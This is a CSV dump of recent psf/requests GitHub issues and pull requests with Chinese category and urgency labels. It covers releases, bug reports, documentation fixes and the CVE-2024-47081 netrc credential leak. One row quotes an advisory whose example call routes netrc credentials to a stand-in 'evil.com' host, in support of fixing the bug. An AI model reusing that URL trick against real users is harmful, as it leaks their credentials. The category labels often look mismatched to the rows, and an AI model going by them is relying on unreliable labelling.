id,title,body,category,urgency,html_url
3131935781,Add Trusted Publishing Release Workflow,"Rather than rely on manual releases from a developer laptop, let's use tag pushes to trigger a workflow to publish artifacts to PyPI. This will leverage trusted publishing and upload attestations as well.",其他,中,https://github.com/psf/requests/pull/6968
3131382148,Can't update to newest release,"I'm trying to update to the newest release (2.32.4), but keep getting a message that I'm already up to date.

## Expected Result

Successfully update to v2.32.4

## Actual Result

Am told that v2.32.3 is the latest release.

## Reproduction Steps

```
py -m pip install requests
WARNING: Ignoring invalid distribution -ip (d:\programs\python\python310\lib\site-packages)
Requirement already satisfied: requests in d:\programs\python\python310\lib\site-packages (2.32.3)
Requirement already satisfied: charset-normalizer<4,>=2 in d:\programs\python\python310\lib\site-packages (from requests) (3.4.1)
Requirement already satisfied: idna<4,>=2.5 in d:\programs\python\python310\lib\site-packages (from requests) (3.10)
Requirement already satisfied: urllib3<3,>=1.21.1 in d:\programs\python\python310\lib\site-packages (from requests) (2.4.0)
Requirement already satisfied: certifi>=2017.4.17 in d:\programs\python\python310\lib\site-packages (from requests) (2025.4.26)
WARNING: Ignoring invalid distribution -ip (d:\programs\python\python310\lib\site-packages)
WARNING: Ignoring invalid distribution -ip (d:\programs\python\python310\lib\site-packages)
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.0""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""101010cf""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```",功能建议,中,https://github.com/psf/requests/issues/6967
3130635903,Bump version and add release notes for v2.32.4,,其他,中,https://github.com/psf/requests/pull/6966
3118164133,Only use hostname to do netrc lookup instead of netloc,Applies the patch generated from the GHSA which we couldn't merge as no one on the team had sufficient permissions.,其他,中,https://github.com/psf/requests/pull/6965
3117600699,CVE-2024-47081: Netrc credential leak in PSF requests library,"There does not yet seem to be an issue nor an advisory about CVE-2024-47081 which was recently disclosed on seclists.org - I'm thus copying the advisory here:

```
From: Juho Forsén via Fulldisclosure <fulldisclosure () seclists org>
Date: Sat, 31 May 2025 06:30:50 +0000
The PSF requests library (https://github.com/psf/requests & https://pypi.org/project/requests/) leaks .netrc 
credentials to third parties due to incorrect URL processing under specific conditions.

Issuing the following API call triggers the vulnerability:

  requests.get('[http://example.com:@evil.com/&apos](http://example.com@evil.com/&apos);)

Assuming .netrc credentials are configured for example.com, they are leaked to evil.com by the call.

The root cause is 
https://github.com/psf/requests/blob/c65c780849563c891f35ffc98d3198b71011c012/src/requests/utils.py#L240-L245

The vulnerability was originally reported to the library maintainers on September 12, 2024, but no fix is available. 
CVE-2024-47081 has been reserved by GitHub for this issue.

As a workaround, clients may explicitly specify the credentials used on every API call to disable .netrc access.
```
Link: https://seclists.org/fulldisclosure/2025/Jun/2","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/issues/6964
3117413449,fix CVE 2024 47081: manual url parsing leads to netloc credentials leak,"https://seclists.org/fulldisclosure/2025/Jun/2

Honestly I have no idea why this lib used `netloc` + manual parsing instead of `hostname` as I can see references to `hostname` as early as from [the python 2.6 docs](https://docs.python.org/2.6/library/urlparse.html).","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6963
3117366854,test: Add new test to check netrc auth leak,"This patch uses the ""hostname"" attribute from the parsed url to get the host, instead of trying to calculate the host from netloc that can produce errors when ""http://username:password@domain.com"" format is used.

This should fix the security issue reported here: [CVE-2024-47081: Netrc credential leak in PSF requests library](
https://seclists.org/oss-sec/2025/q2/204)","Bug反馈, 功能建议, 账号问题",中,https://github.com/psf/requests/pull/6962
3114387592,Fix type in README,,"Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6961
3111747867,docs: clarify Quickstart POST example (fixes #6949),"Remove the line that says r1.text == r2.text == True and add a note about X-Amzn-Trace-Id, showing how to compare r1.json()['form'] instead.","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6960
3103121851,Vulnerability identified with 2.32.3,"Hi Team,

We have a vulnerability identidied with version v2.32.3, linked to CVE-2014-1830 and CVE-2015-2296. Kindly have it addressed.

Regards,
Ravi",其他,中,https://github.com/psf/requests/issues/6957
3099420365,"Urgent Help Required - ""Remote end closed connection without response"" error while using python Python 3.5.2 and request module 2.11.1","This is an urgent request. We are currently using Python 3.5.2 and the requests module version 2.11.1. We are encountering the following error:

Remote end closed connection without response

We are aware that this issue can typically be resolved by implementing a retry mechanism. However, our question is:

Is there any version of the requests module that handles retries automatically, without requiring us to manually implement retry logic?

If newer versions of the requests module have introduced built-in automatic retry handling, could you please let us know which version includes this feature?

Your assistance would be greatly appreciated.


","Bug反馈, 功能建议, 网络连接失败",高,https://github.com/psf/requests/issues/6956
3095894846,Fix #6917: Correct Content-Length for io.StringIO with multi-byte UTF-8,"Fixes #6917

This PR resolves the incorrect `Content-Length` calculation when using `io.StringIO` as the request body. Key changes:

1. Added special handling for `io.StringIO` in the `super_len` function
2. Calculates the correct byte length by encoding content as UTF-8
3. Added test cases to validate the fix

Test results:
- `Content-Length` now accurately reflects byte count for `io.StringIO` with multi-byte characters
- All existing tests remain passing","Bug反馈, 功能建议",高,https://github.com/psf/requests/pull/6955
3089003699,class HeaderDict(rest_requests.packages.urllib3._collections.HTTPHeaderDict): AttributeError: module 'requests' has no attribute 'packages',"> fix released in 2.17.2! 

 _Originally posted by @kennethreitz in [#4104](https://github.com/psf/requests/issues/4104#issuecomment-304734015)_

Im using requests 2.32.3 with djangorestframework 3.16.0 but im still having the same problem: This [commit](https://github.com/requests/requests/commit/588e8f7f640f774e71d61b53ccb34d310172e0ad) seems to have broken requests.packages.

 from rest_framework.test import APITestCase
<frozen importlib._bootstrap>:1360: in _find_and_load
    ???
<frozen importlib._bootstrap>:1331: in _find_and_load_unlocked
    ???
<frozen importlib._bootstrap>:935: in _load_unlocked
    ???
..\.venv\Lib\site-packages\_pytest\assertion\rewrite.py:185: in exec_module
    exec(co, module.__dict__)
..\.venv\Lib\site-packages\rest_framework\test.py:27: in <module>
    class HeaderDict(rest_requests.packages.urllib3._collections.HTTPHeaderDict):
AttributeError: module 'requests' has no attribute 'packages'
ERROR users/tests.py - AttributeError: module 'requests' has no attribute 'packages'

Somebody please help me","Bug反馈, 功能建议, 账号问题",中,https://github.com/psf/requests/issues/6954
3084543992,fix(headers): content-length shouldnt be set to 0 for all body-less methods,"Currently we use `self.method not in (""GET"", ""HEAD"")` to determine ""methods that can have a body but don't provide one""

However, there are other [HTTP methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods) that cannot have a body.
Servers can consider it an error if Content-Length=0 when no data is expected. For example, the [Sanic server's position](https://github.com/sanic-org/sanic/issues/2915#issuecomment-2029785788).

MUST have body: PATCH, POST, PUT
MUST NOT have body: GET, HEAD, [TRACE](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.8-4)
SHOULD NOT have body (no official use): [CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6-13), [DELETE](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.5-6), [OPTIONS](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.7-6)

Proposing that Content-Length be set to 0 when there's no data, only for PATCH, POST, PUT methods since those must have content. DELETE should not have content although it seems most common out of the ""SHOULD NOT"" category so we can grandfather it in.","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6953
3083150353,New release,"Hi,

Could you tell me, please, if you plan any new releases soon?
The latest versions is about one year old, and our code analyzers complain about this raising a high operational risk.
So I am just curious now, what are your plans.",其他,高,https://github.com/psf/requests/issues/6952
3080771183,docs: fix dead links to kenreitz.org,"I noticed a few dead links. Looking back through the [wayback machine](https://web.archive.org/web/20220203091232/https://kenreitz.org/essays/2012/06/14/the-future-of-python-http), I was able to find the new location of these articles.","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6951
3079446521,digest  bug,"```py
import requests
from requests.auth import HTTPDigestAuth
# 认证凭据
USERNAME = ""Default User""
PASSWORD = ""robotics""

# 创建一个保持会话和Cookies的对象
session = requests.Session()

# 设置目标URL
url = ""http://127.0.0.1:80/subscription""

# 准备POST数据
post_data = {
    ""resources"": ""1"",
    ""1"":""/rw/panel/ctrlstate"",
    ""1-p"":""0""
}

try:
    # 发送带Digest认证的POST请求
    post_response = session.post(
        url,
        data=post_data,
        auth=HTTPDigestAuth(USERNAME, PASSWORD)
    )
    post_response.raise_for_status()

    print(f""POST响应状态码: {post_response.status_code}"")
    print(""POST请求后的Cookies:"")
    print(session.cookies.get_dict())
    print(""\n响应内容:"")
    print(post_response.text)
    # 发送带相同认证的GET请求
    get_response = session.get(
        url,
        auth=HTTPDigestAuth(USERNAME, PASSWORD)
    )
    get_response.raise_for_status()

    print(f""\nGET响应状态码: {get_response.status_code}"")
    print(""GET请求后的Cookies:"")
    print(session.cookies.get_dict())
    print(""\n响应内容:"")
    print(get_response.text)

except requests.exceptions.HTTPError as http_err:
    print(f""HTTP错误发生: {http_err}"")
    if post_response.status_code == 401:
        print(""认证失败，请检查用户名密码"")
except requests.exceptions.RequestException as req_err:
    print(f""请求异常: {req_err}"")
except Exception as e:
    print(f""其他错误: {e}"")
```


```
POST状态码: 201
POST Cookies:
-http-session-=23::http.session::5ed62c3908feb133b8a771f64e631c5a
ABBCX=53

POST响应内容:
<?xml version=""1.0"" encoding=""utf-8""?><html xmlns=""http://www.w3.org/1999/xhtml""> <head> <title>Event</title><base href=""http://localhost:80/""/> </head> <body>  <div class=""state""><a href=""subscription/24"" rel=""group""></a><a href=""ws://localhost:80/poll/24"" rel=""self""></a><a href=""subscription/24?action=show"" rel=""action""></a> <ul> <li class=""pnl-ctrlstate-ev"" title=""ctrlstate""><a href=""/rw/panel/ctrlstate"" rel=""self""></a><span class=""ctrlstate"">motoron</span></li>  </ul> </div> </body></html>

GET状态码: 200
GET Cookies:
-http-session-=23::http.session::5ed62c3908feb133b8a771f64e631c5a
ABBCX=54

GET响应内容:
<?xml version=""1.0"" encoding=""utf-8""?><html xmlns=""http://www.w3.org/1999/xhtml""> <head> <title>Groups</title> <base href=""http://localhost:80/subscription/""/></head> <body> <div class=""state""><a href="""" rel=""self""></a><a href=""?action=show"" rel=""action""></a><ul></ul></div></body></html>
```


ABBCX Error","Bug反馈, 功能建议, 账号问题",中,https://github.com/psf/requests/issues/6950
3077733650,QuickStart documentation error,"httpbin post has a header item '""X-Amzn-Trace-Id"" which causes an result which is contrary to the  documentation. 

## Quickstart documentation 
### ""More complicated POST requests""
```
payload_tuples = [('key1', 'value1'), ('key1', 'value2')]
r1 = requests.post('https://httpbin.org/post', data=payload_tuples)
payload_dict = {'key1': ['value1', 'value2']}
r2 = requests.post('https://httpbin.org/post', data=payload_dict)
print(r1.text)
{
  ...
  ""form"": {
    ""key1"": [
      ""value1"",
      ""value2""
    ]
  },
  ...
}
r1.text == r2.text
True
```

## Actual Result

<!-- What happened instead. -->

## Reproduction Steps

```python
import requests
payload_tuples = [('key1', ' ""value1'),('key1', 'value2')]
payload_dict = {'key1': ['value1', 'value2']}
r1 = requests.post('https://httpbin.org/post', data=payload_tuples)
r2 = requests.post('https://httpbin.org/post', data=payload_dict)
r1.text == r2.text
False
r1.json()['form'] == r2.json()['form']
True

```

## Diagnostic Information

pprint.pprint(r1.text)
('{…
 '  ""form"": {\n'
 '    ""key1"": [\n'
 '      ""value1"", \n'
 '      ""value2""\n'
 '    ]}
…
 '    ""X-Amzn-Trace-Id"": ""Root=1-682cb364-67bf5e846c56c77e24839642""\n'
 '… },
…

pprint.pprint(r2.text)
('{…
 '  ""form"": {\n'
 '    ""key1"": [\n'
 '      ""value1"", \n'
 '      ""value2""\n'
 '    ]}
…
 '    ""X-Amzn-Trace-Id"": ""Root=1-682cb30f-208ede8e2eda5cf75cf578ac""\n'
 ' … }, 
 …
","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/issues/6949
3054039817,"Add enhancements: Advanced Retry Mechanism, Middleware System, and Enhanced Timeout Controls","## Summary of Implemented Features

1. Request/Response Middleware System:
- Created a flexible middleware framework for processing requests and responses
- Implemented common middleware classes (logging, timing, headers, etc.)
- Added support for custom middleware

2. Enhanced Timeout Controls:
- Added granular timeout controls for different phases of the request (connect, read, write)
- Implemented timeout strategies for retries (constant, linear, exponential)
- Integrated with the existing retry system

3. Advanced Retry Mechanism (previously implemented):
- Added support for different backoff strategies
- Implemented customizable retry conditions
- Added respect for Retry-After headers","功能建议, 网络连接失败",中,https://github.com/psf/requests/pull/6948
3052530154,verify=False crashes on py3.13 on windows (FileNotFoundError),"I have a tests where I do `self._session.verify = False` to my requests session, it fails:

```
src\ansys\simai\core\api\mixin.py:99: in _get
    return self._request(""GET"", url, *args, **kwargs)
src\ansys\simai\core\api\mixin.py:149: in _request
    self._session.request(method, full_url, *args, **kwargs),
.venv\Lib\site-packages\requests\sessions.py:589: in request
    resp = self.send(prep, **send_kwargs)
.venv\Lib\site-packages\requests\sessions.py:746: in send
    r.content
.venv\Lib\site-packages\requests\models.py:902: in content
    self._content = b"""".join(self.iter_content(CONTENT_CHUNK_SIZE)) or b""""
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _

    def generate():
        # Special case for urllib3.
        if hasattr(self.raw, ""stream""):
            try:
                yield from self.raw.stream(chunk_size, decode_content=True)
            except ProtocolError as e:
>               raise ChunkedEncodingError(e)
E               requests.exceptions.ChunkedEncodingError: (""Connection broken: FileNotFoundError(2, 'No such file or directory')"", FileNotFoundError(2, 'No such file or directory'))
```

See action run: https://github.com/ansys/pysimai/actions/runs/14931636639/job/41949246539
See the same test without `self._session.verify = False`: https://github.com/ansys/pysimai/actions/runs/14932156717/job/41951055780


## Expected Result

`session.verify = False` works.

## Actual Result

`session.verify = False` causes `FileNotFoundError`.

## Reproduction Steps

TODO (the only windows env I have except github actions is the great windows XP)","Bug反馈, 功能建议, 网络连接失败",中,https://github.com/psf/requests/issues/6947
3045850311,[Security] Medium Severity Vulnerability (CVE-2015-2296) in Requests v2.32.3,"A potential medium-severity security issue has been identified in the requests library, version 2.32.3, due to indirect implications of https://github.com/advisories/GHSA-pg2w-x9wp-vw92.

The resolve_redirects function in sessions.py in requests 2.1.0 through 2.5.3 allows remote attackers to conduct session fixation attacks via a cookie without a host value in a redirect.

References:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2296
https://nvd.nist.gov/vuln/detail/CVE-2015-2296","Bug反馈, 功能建议",中,https://github.com/psf/requests/issues/6946
3043475439,`SSLCertVerificationError` when fetching `https://od.moi.gov.tw/api/v1/`,"Fetching API under `https://od.moi.gov.tw/api/v1/` raises an `SSLCertVerificationError`, while no certificate issue is reported when opening the same URL in the browser (latest Chrome or Firefox).

## Expected Result

No error should be raised.

## Actual Result

An error is raised: `requests.exceptions.SSLError: HTTPSConnectionPool(host='od.moi.gov.tw', port=443): Max retries exceeded with url: /api/v1/rest/datastore/A01010000C-002150-013?limit=1 (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: Missing Subject Key Identifier (_ssl.c:1028)')))`

## Reproduction Steps

```python
import requests
import certifi
url = 'https://od.moi.gov.tw/api/v1/rest/datastore/A01010000C-002150-013?limit=1'
requests.get(url, verify=certifi.where())
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": ""5.2.0""
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.3""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000100""
  },
  ""urllib3"": {
    ""version"": ""2.4.0""
  },
  ""using_charset_normalizer"": false,
  ""using_pyopenssl"": false
}
```
","Bug反馈, 功能建议, 网络连接失败",中,https://github.com/psf/requests/issues/6945
3040883809,Project Control / Ownership,"In light of this tweet (https://x.com/kennethreitz42/status/1919466982467940750):

<img width=""602"" alt=""Image"" src=""https://github.com/user-attachments/assets/ed8e8541-90fc-4506-aaa8-4aebed881dc1"" />

Does Kenneth Reitz have the permissions required to remove this project from GitHub and/or PyPI?
",账号问题,中,https://github.com/psf/requests/issues/6944
3040037398,Error de red o descarga: ('Connection broken: IncompleteRead (ayuda no puedo descargar .zip de copernicus)  thanks!,"import requests
import pandas as pd
import geopandas as gpd
from shapely.geometry import shape
from requests.exceptions import RequestException
import time

# Credenciales
copernicus_user = ""usuario_name""
copernicus_password = ""password""
client_id = ""cdse-public""

# Área de interés (WKT)
ft = ""POLYGON((-6.305113 37.195728, -6.305113 37.205728, -6.295113 37.205728, -6.295113 37.195728, -6.305113 37.195728))""

# Colección y fechas
data_collection = ""SENTINEL-2""
start_date = ""2025-04-24""
end_date = ""2025-04-25""

# Tile específico a descargar
tile_to_download = ""S2B_MSIL2A_20250425T110619_N0511_R137_T29SQB_20250425T140306.SAFE""

# Función para obtener tokens
def get_tokens(username=None, password=None, refresh_token=None):
    url = ""https://identity.dataspace.copernicus.eu/auth/realms/CDSE/protocol/openid-connect/token""
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    if refresh_token:
        data = {
            ""grant_type"": ""refresh_token"",
            ""refresh_token"": refresh_token,
            ""client_id"": client_id
        }
    else:
        data = {
            ""grant_type"": ""password"",
            ""username"": username,
            ""password"": password,
            ""client_id"": client_id
        }

    r = requests.post(url, headers=headers, data=data)
    r.raise_for_status()
    token_json = r.json()
    return token_json[""access_token""], token_json.get(""refresh_token"")

# Obtener tokens inicialmente
try:
    access_token, refresh_token = get_tokens(username=copernicus_user, password=copernicus_password)
except Exception as e:
    print(""❌ Error autenticando:"", e)
    exit()

# Consultar catálogo
print(""🔎 Consultando catálogo..."")
catalog_url = (
    f""https://catalogue.dataspace.copernicus.eu/odata/v1/Products?""
    f""$filter=Collection/Name eq '{data_collection}' and ""
    f""OData.CSC.Intersects(area=geography'SRID=4326;{ft}') and ""
    f""ContentDate/Start ge {start_date}T00:00:00.000Z and ""
    f""ContentDate/Start le {end_date}T23:59:59.999Z&$count=True&$top=1000""
)

response = requests.get(catalog_url)
products = response.json().get(""value"", [])

if not products:
    print(""⚠️ No se encontraron productos."")
    exit()

# Procesar productos
df = pd.DataFrame(products)
df[""geometry""] = df[""GeoFootprint""].apply(shape)
gdf = gpd.GeoDataFrame(df, geometry=""geometry"")
gdf = gdf[~gdf[""Name""].str.contains(""L1C"")]  # Solo L2A

print(f""📦 Total escenas L2A encontradas: {len(gdf)}"")
for name in gdf[""Name""]:
    print("" -"", name)

# Filtrar tile deseado
tile = gdf[gdf[""Name""] == tile_to_download]

if tile.empty:
    print(f""⚠️ Tile no encontrado: {tile_to_download}"")
    exit()

row = tile.iloc[0]
session = requests.Session()
session.headers.update({""Authorization"": f""Bearer {access_token}""})

# Iniciar descarga
try:
    print(f""\n⬇️ Descargando: {row['Name']}"")
    url = f""https://catalogue.dataspace.copernicus.eu/odata/v1/Products({row['Id']})/$value""
    response = session.get(url, allow_redirects=False)

    # Seguir redirecciones
    while response.status_code in (301, 302, 303, 307):
        url = response.headers[""Location""]
        response = session.get(url, allow_redirects=False)

    # Si el token ha vencido, intentar renovarlo
    if response.status_code == 401 and refresh_token:
        print(""🔁 Token vencido, renovando..."")
        try:
            access_token, refresh_token = get_tokens(refresh_token=refresh_token)
            session.headers.update({""Authorization"": f""Bearer {access_token}""})
            response = session.get(url, allow_redirects=False)
            while response.status_code in (301, 302, 303, 307):
                url = response.headers[""Location""]
                response = session.get(url, allow_redirects=False)
        except Exception as e:
            print(""❌ Error al renovar el token:"", e)
            exit()

    # Descargar archivo final
    file = session.get(url, verify=False, stream=True)
    file.raise_for_status()

    filename = f""{row['Name']}.zip""
    with open(filename, ""wb"") as f:
        for chunk in file.iter_content(chunk_size=1024 * 1024):  # 1 MB
            if chunk:
                f.write(chunk)

    print(f""✅ Descarga completa: {filename}"")

except RequestException as e:
    print(""❌ Error de red o descarga:"", e)
except Exception as e:
    print(""❌ Error inesperado:"", e)
","Bug反馈, 功能建议, 账号问题, 网络连接失败",中,https://github.com/psf/requests/issues/6943
3039592617,[Security] Medium Severity Vulnerability (CVE-2015-2296) in Requests v2.32.3,"A potential medium-severity security issue has been identified in the requests library, version 2.32.3, due to indirect implications of CVE-2015-2296.

The resolve_redirects function in sessions.py in requests 2.1.0 through 2.5.3 allows remote attackers to conduct session fixation attacks via a cookie without a host value in a redirect.

*References:*
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2296
https://nvd.nist.gov/vuln/detail/CVE-2015-2296","Bug反馈, 功能建议",中,https://github.com/psf/requests/issues/6942
3037081068,tests: add trailing-slash mount behavior tests (#6935),"Closes #6935 

**What** Added two new pytest functions to cover: 
- mounting with a trailing slash matches only that exact prefix 
- mounting without a trailing slash still yields the adapter but warns in docs 

**Why** 
Ensures documented “good first issue” behavior is tested, prevents regressions in URL-prefix matching logic.","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6941
3026200627,3.0,,其他,中,https://github.com/psf/requests/pull/6940
3025643272,Bump actions/setup-python from 5.5.0 to 5.6.0,"Bumps [actions/setup-python](https://github.com/actions/setup-python) from 5.5.0 to 5.6.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/setup-python/releases"">actions/setup-python's releases</a>.</em></p>
<blockquote>
<h2>v5.6.0</h2>
<h2>What's Changed</h2>
<ul>
<li>Workflow updates related to Ubuntu 20.04 by <a href=""https://github.com/aparnajyothi-y""><code>@​aparnajyothi-y</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1065"">actions/setup-python#1065</a></li>
<li>Fix for Candidate Not Iterable Error by <a href=""https://github.com/aparnajyothi-y""><code>@​aparnajyothi-y</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1082"">actions/setup-python#1082</a></li>
<li>Upgrade semver and <code>@​types/semver</code> by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1091"">actions/setup-python#1091</a></li>
<li>Upgrade prettier from 2.8.8 to 3.5.3 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1046"">actions/setup-python#1046</a></li>
<li>Upgrade ts-jest from 29.1.2 to 29.3.2 by <a href=""https://github.com/dependabot""><code>@​dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1081"">actions/setup-python#1081</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/setup-python/compare/v5...v5.6.0"">https://github.com/actions/setup-python/compare/v5...v5.6.0</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/setup-python/commit/a26af69be951a213d495a4c3e4e4022e16d87065""><code>a26af69</code></a> Bump ts-jest from 29.1.2 to 29.3.2 (<a href=""https://redirect.github.com/actions/setup-python/issues/1081"">#1081</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/30eafe95483bd95135b7eda0c66a0369af9afdf1""><code>30eafe9</code></a> Bump prettier from 2.8.8 to 3.5.3 (<a href=""https://redirect.github.com/actions/setup-python/issues/1046"">#1046</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/5d95bc16d4bc83bb56202da9630d84c6f8a2d8f5""><code>5d95bc1</code></a> Bump semver and <code>@​types/semver</code> (<a href=""https://redirect.github.com/actions/setup-python/issues/1091"">#1091</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/6ed2c67c8abe7646815dbd50364eea862d396fd9""><code>6ed2c67</code></a> Fix for Candidate Not Iterable Error (<a href=""https://redirect.github.com/actions/setup-python/issues/1082"">#1082</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/e348410e00f449ece8581cb8e88be8f0e7712da6""><code>e348410</code></a> Remove Ubuntu 20.04 from workflows due to deprecation from 2025-04-15 (<a href=""https://redirect.github.com/actions/setup-python/issues/1065"">#1065</a>)</li>
<li>See full diff in <a href=""https://github.com/actions/setup-python/compare/8d9ed9ac5c53483de85588cdf95a591a75ab9f55...a26af69be951a213d495a4c3e4e4022e16d87065"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/setup-python&package-manager=github_actions&previous-version=5.5.0&new-version=5.6.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/pull/6939
3021925694,Bug: URL parameters lost when hash fragment exists,"## 问题描述  
URL中包含`#`时，`?`后的查询参数被错误丢弃  

## 复现步骤  
```python
import requests
r = requests.get(""http://example.com?key=value#fragment"")
print(r.url)  # 实际输出：http://example.com/","Bug反馈, 功能建议, 文档问题",中,https://github.com/psf/requests/issues/6938
3013653517,ci: update to ubuntu-24.04 in workflow,"### Related issue
https://github.com/actions/runner-images/issues/11101

### What does this PR do?
Update workflow OS versions to ubuntu-24.04, version 20.04 is no longer allowed on GitHub action making ci lint broke e.g.:
https://github.com/psf/requests/actions/runs/14607511655/job/40981665101?pr=6936","Bug反馈, 功能建议",中,https://github.com/psf/requests/pull/6937
3012427324,test: add two more tests exercising the adapter,"This PR adds two test cases for `Session.mount()` to cover the documentation's recommendation about trailing slashes in prefixes (see #6935). 

The first test `test_session_get_adapter_prefix_with_trailing_slash` verifies that prefixes with a trailing / (e.g., https://example.com/) match only the intended hostname. 

The second test `test_session_get_adapter_prefix_without_trailing_slash` verifies that prefixes without a trailing / (e.g., https://example.com) match both the intended hostname and extended hostnames (e.g., https://example.com.other.com), as warned in the docs. 

Together, these tests ensure the longest prefix match behavior is well-documented and stable.","Bug反馈, 文档问题",中,https://github.com/psf/requests/pull/6936
